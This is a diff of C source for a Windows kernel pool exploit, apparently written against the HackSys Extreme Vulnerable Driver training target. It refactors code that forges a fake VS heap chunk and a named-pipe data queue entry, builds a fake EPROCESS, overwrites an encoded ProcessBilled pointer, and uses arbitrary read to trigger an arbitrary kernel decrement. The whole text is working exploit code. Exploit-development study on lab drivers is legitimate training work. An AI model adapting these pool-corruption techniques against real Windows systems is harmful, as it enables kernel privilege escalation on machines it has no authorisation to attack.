@@ -9,7 +9,8 @@
 #include "pipe_utils/pipe_utils.h"
 #include "hevd/hevd.h"
 
-vs_chunk_t g_fake_process_billed_chunk = { 0 };
+char g_fake_process_billed_chunk_buf[sizeof(vs_chunk_t) + 0x8] = { 0 };
+vs_chunk_t* g_fake_process_billed_chunk = (vs_chunk_t*)g_fake_process_billed_chunk_buf;
 
 uintptr_t locateVsSubSegment(exploit_pipes_t* pipes, exploit_addresses_t* addrs)
 {
@@ -53,21 +54,22 @@ void constructFakeVsChunk(exploit_addresses_t* addrs, uintptr_t vs_sub_segment)
     new_encoded_vs_header[0] = new_encoded_vs_header[0] ^ addrs->ghost_vs_chunk ^ addrs->RtlpHpHeapGlobals;
     new_encoded_vs_header[1] = new_encoded_vs_header[1] ^ addrs->ghost_vs_chunk ^ addrs->RtlpHpHeapGlobals;
 
-    g_fake_process_billed_chunk.encoded_vs_header[0] = new_encoded_vs_header[0];
-    g_fake_process_billed_chunk.encoded_vs_header[1] = new_encoded_vs_header[1];
-    g_fake_process_billed_chunk.pool_header.PreviousSize = 0;
-    g_fake_process_billed_chunk.pool_header.PoolIndex = 0;
-    g_fake_process_billed_chunk.pool_header.BlockSize = 0x100 / 0x10;
-    g_fake_process_billed_chunk.pool_header.PoolType = 8;
-    g_fake_process_billed_chunk.pool_header.PoolTag = 0x42424242;
-    g_fake_process_billed_chunk.pipe_queue_entry.list.Flink = (LIST_ENTRY*)addrs->root_pipe_queue_entry;
-    g_fake_process_billed_chunk.pipe_queue_entry.list.Blink = (LIST_ENTRY*)addrs->root_pipe_queue_entry;
-    g_fake_process_billed_chunk.pipe_queue_entry.linkedIRP = 0;
-    g_fake_process_billed_chunk.pipe_queue_entry.SecurityClientContext = 0;
-    g_fake_process_billed_chunk.pipe_queue_entry.isDataInKernel = 0;
-    g_fake_process_billed_chunk.pipe_queue_entry.DataSize = PIPE_QUEUE_ENTRY_BUFSIZE(GHOST_BLOCK_SIZE);
-    g_fake_process_billed_chunk.pipe_queue_entry.remaining_bytes = PIPE_QUEUE_ENTRY_BUFSIZE(GHOST_BLOCK_SIZE);
-    g_fake_process_billed_chunk.pipe_queue_entry.field_2C = 0;
+    g_fake_process_billed_chunk->encoded_vs_header[0] = new_encoded_vs_header[0];
+    g_fake_process_billed_chunk->encoded_vs_header[1] = new_encoded_vs_header[1];
+    g_fake_process_billed_chunk->pool_header.PreviousSize = 0;
+    g_fake_process_billed_chunk->pool_header.PoolIndex = 0;
+    g_fake_process_billed_chunk->pool_header.BlockSize = 0x100 / 0x10;
+    g_fake_process_billed_chunk->pool_header.PoolType = 8;
+    g_fake_process_billed_chunk->pool_header.PoolTag = 0x42424242;
+    g_fake_process_billed_chunk->np_data_queue_entry.QueueEntry.Flink = (LIST_ENTRY*)addrs->np_ccb_data_queue;
+    g_fake_process_billed_chunk->np_data_queue_entry.QueueEntry.Blink = (LIST_ENTRY*)addrs->np_ccb_data_queue;
+    g_fake_process_billed_chunk->np_data_queue_entry.Irp = 0;
+    g_fake_process_billed_chunk->np_data_queue_entry.ClientSecurityContext = 0;
+    g_fake_process_billed_chunk->np_data_queue_entry.DataEntryType = 0;
+    g_fake_process_billed_chunk->np_data_queue_entry.DataSize = CALC_NDQE_DataSize(GHOST_CHUNK_SIZE);
+    g_fake_process_billed_chunk->np_data_queue_entry.QuotaInEntry = CALC_NDQE_DataSize(GHOST_CHUNK_SIZE);
+    g_fake_process_billed_chunk->np_data_queue_entry.unknown = 0;
+    *((uint64_t*)g_fake_process_billed_chunk->np_data_queue_entry.data) = GHOST_CHUNK_MARKER_2;
 }
 
 int SetupArbitraryDecrement(exploit_pipes_t* pipes, exploit_addresses_t* addrs)
@@ -83,19 +85,19 @@ int SetupArbitraryDecrement(exploit_pipes_t* pipes, exploit_addresses_t* addrs)
 
 uintptr_t allocFakeEprocess(exploit_pipes_t* pipes, exploit_addresses_t* addrs, char* fake_eprocess_buf)
 {
-    // Write fake EPROCESS data to the previous chunk pipe, creating a linked pipe queue entry
+    // Write fake EPROCESS data to the previous chunk pipe, creating a linked NP_DATA_QUEUE_ENTRY
     WriteDataToPipe(&pipes->previous_chunk_pipe, fake_eprocess_buf, FAKE_EPROCESS_SIZE);
 
-    // Calculate address of the previous chunk's pipe_queue_entry
-    uintptr_t prev_vs_chunk_addr = addrs->ghost_vs_chunk - PREV_CHUNK_OFFSET;
-    uintptr_t prev_pipe_queue_entry_addr = prev_vs_chunk_addr + sizeof(HEAP_VS_CHUNK_HEADER) + sizeof(POOL_HEADER);
+    // Calculate address of the previous chunk's NP_DATA_QUEUE_ENTRY
+    uintptr_t prev_vs_chunk = addrs->ghost_vs_chunk - PREV_CHUNK_OFFSET;
+    uintptr_t prev_np_data_queue_entry = prev_vs_chunk + sizeof(HEAP_VS_CHUNK_HEADER) + sizeof(POOL_HEADER);
 
-    // Get address of the new pipe_queue_entry via Flink
-    uintptr_t new_pipe_queue_entry_addr;
-    ArbitraryRead(&pipes->ghost_chunk_pipe, prev_pipe_queue_entry_addr + offsetof(LIST_ENTRY, Flink), (char*)&new_pipe_queue_entry_addr, 0x8);
+    // Get address of the new NP_DATA_QUEUE_ENTRY via Flink
+    uintptr_t new_np_data_queue_entry;
+    ArbitraryRead(&pipes->ghost_chunk_pipe, prev_np_data_queue_entry + offsetof(LIST_ENTRY, Flink), (char*)&new_np_data_queue_entry, 0x8);
 
-    // Return the address of the fake EPROCESS within the new pipe queue data buffer
-    return new_pipe_queue_entry_addr + offsetof(pipe_queue_entry_t, data) + FAKE_EPROCESS_OFFSET;
+    // Return the address of the fake EPROCESS within the new NP_DATA_QUEUE_ENTRY's data buffer
+    return new_np_data_queue_entry + offsetof(NP_DATA_QUEUE_ENTRY, data) + FAKE_EPROCESS_OFFSET;
 }
 
 int setupFakeEprocess(char* fake_eprocess_buf, uintptr_t addr_to_decrement)
@@ -105,26 +107,26 @@ int setupFakeEprocess(char* fake_eprocess_buf, uintptr_t addr_to_decrement)
     PVOID addr = (PVOID)((DWORD64)fake_eprocess_buf + FAKE_EPROCESS_OFFSET);
 
     // Pcb.Header.Type
-    memset((char*)addr + EPROCESS_TYPE_OFFSET, 0x3, 1);
+    memset((char*)addr + EPROCESS_Type_OFFSET, 0x3, 1);
 
     // QuotaBlock: Set address to decrement in fake structure
-    memcpy((char*)addr + EPROCESS_QUOTA_BLOCK_OFFSET, &addr_to_decrement, sizeof(DWORD64));
+    memcpy((char*)addr + EPROCESS_QuotaBlock_OFFSET, &addr_to_decrement, sizeof(DWORD64));
 
     return 1;
 }
 
 void setFakeProcessBilled(exploit_pipes_t* pipes, exploit_addresses_t* addrs, uintptr_t fake_eprocess)
 {
-    g_fake_process_billed_chunk.pool_header.ProcessBilled = fake_eprocess ^ addrs->ExpPoolQuotaCookie ^ (addrs->ghost_vs_chunk + sizeof(HEAP_VS_CHUNK_HEADER));
+    g_fake_process_billed_chunk->pool_header.ProcessBilled = fake_eprocess ^ addrs->ExpPoolQuotaCookie ^ (addrs->ghost_vs_chunk + sizeof(HEAP_VS_CHUNK_HEADER));
 
-    uintptr_t pipe_queue_entry_addr = NULL;
+    uintptr_t ghost_np_data_queue_entry = NULL;
     do
     {
         printf(".");
-        FreeNPPNxChunk(pipes->previous_chunk_pipe, VULN_BLOCK_SIZE);
-        pipes->previous_chunk_pipe = AllocNPPNxChunk(&g_fake_process_billed_chunk, VULN_BLOCK_SIZE);
-        ArbitraryRead(&pipes->ghost_chunk_pipe, addrs->root_pipe_queue_entry, (char*)&pipe_queue_entry_addr, 0x8);
-    } while (pipe_queue_entry_addr != 0x4141414141414141);
+        FreeNpDataQueueEntry(pipes->previous_chunk_pipe, VULN_CHUNK_SIZE);
+        pipes->previous_chunk_pipe = AllocNpDataQueueEntry(VULN_CHUNK_SIZE, (char*)g_fake_process_billed_chunk, sizeof(vs_chunk_t) + 0x8);
+        ArbitraryRead(&pipes->ghost_chunk_pipe, addrs->np_ccb_data_queue, (char*)&ghost_np_data_queue_entry, 0x8);
+    } while (ghost_np_data_queue_entry != GHOST_CHUNK_MARKER_2);
     printf("\n");
 }
 
@@ -142,7 +144,7 @@ int ArbitraryDecrement(exploit_pipes_t* pipes, exploit_addresses_t* addrs, uintp
     setFakeProcessBilled(pipes, addrs, fake_eprocess);
 
     puts("[*] Freeing ghost chunk to trigger arbitrary decrement");
-    FreeNPPNxChunk(pipes->ghost_chunk_pipe, GHOST_BLOCK_SIZE);
+    FreeNpDataQueueEntry(pipes->ghost_chunk_pipe, GHOST_CHUNK_SIZE);
 
     return 1;
 }
